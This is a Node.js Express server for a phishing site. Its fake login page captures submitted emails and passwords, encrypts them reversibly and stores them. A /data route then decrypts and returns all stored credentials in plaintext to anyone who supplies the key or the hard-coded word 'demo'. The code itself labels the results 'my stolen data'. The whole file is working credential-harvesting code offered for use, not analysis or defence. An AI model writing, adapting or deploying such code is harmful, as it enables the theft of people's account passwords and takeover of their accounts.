//Include required libraries and files
const express = require('express')
const app = express()
const bodyParser = require('body-parser')
const sqlite3 = require('sqlite3').verbose()
const crypto = require('crypto')
require('dotenv').config()

//Declaring database and encryption variables
const db = new sqlite3.Database('./database/users.db')
const key = Buffer.from(process.env.KEY, 'utf8') 
const iv = process.env.IV
const algorithm = 'aes256'

//Setting up express library
app.set('view engine', 'ejs')
app.use(express.static('public'))
app.use(bodyParser.urlencoded({ extended: true }))
app.use(bodyParser.json())

//Index route which renders login page
app.get('/', (req, res) => {
    res.render('index')
})

//Login route which sends data to database
app.post('/login', async (req, res) => {
    const email = await req.body.email
    const password = await req.body.password
    var passwordCipher = crypto.createCipheriv(algorithm, key, iv);  
    var passowrdEncrypted = passwordCipher.update(password, 'utf8', 'hex') + passwordCipher.final('hex');
    db.run('INSERT INTO users VALUES (?, ?)', [email, passowrdEncrypted], (err) => {
        if(err){
            console.log(err)
            return
        }
        res.status(500)
    })
})

//Data riute which shows stored data as json object
app.get('/data', (req, res) => {
    if(req.query.key == key || req.query.key == 'demo'){
        db.all('SELECT * FROM users', (err, rows) => {
            if(err){
                console.log(err)
                return
            }
            passwords = []
            rows.forEach(row => {
                const userdata = {}
                userdata.email = row.email
                var passwordDecipher = crypto.createDecipheriv(algorithm, key, iv);
                var decryptedPassword = passwordDecipher.update(row.password, 'hex', 'utf8') + passwordDecipher.final('utf8');
                
                userdata.password = decryptedPassword
                passwords.push(userdata)
            })
            console.log(passwords)
            res.json(passwords)
        })
    }else{
        res.status(403)
        res.json({message: 'Wrong key for my stolen data'})
    }
})

//Running server on TCP port 3000
app.listen(3000)